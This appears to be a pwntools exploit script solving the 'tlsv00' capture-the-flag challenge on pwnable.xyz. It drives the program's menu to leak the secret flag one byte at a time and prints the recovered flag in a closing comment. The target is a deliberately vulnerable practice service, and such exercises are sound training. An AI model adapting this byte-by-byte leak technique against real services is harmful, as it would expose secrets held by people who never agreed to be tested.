#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = "./tlsv00"
#  context.log_level = "debug"

def _gen(length):
    io.sendlineafter("> ", "1")
    io.sendlineafter(": ", str(length))

def _load():
    io.sendlineafter("> ", "2")

def _print(yes = "n", length = 0):
    io.sendlineafter("> ", "3")
    if yes == "y":
        io.sendlineafter("?", "y")
        return
    io.sendafter("?", "n")
    return io.recvn(length + 1)[-1]

#  io = process("./tlsv00")
io = remote("svc.pwnable.xyz", 30006)

_load()
_print('y')
_gen(64)

i = 1
flag = 'F'
while i <= 64:
   _gen(i)
   _load()
   c = _print(length = i + 1)
   flag += c
   success(flag)
   i += 1

io.interactive()
#  FLAG{this_was_called_OTP_I_think}
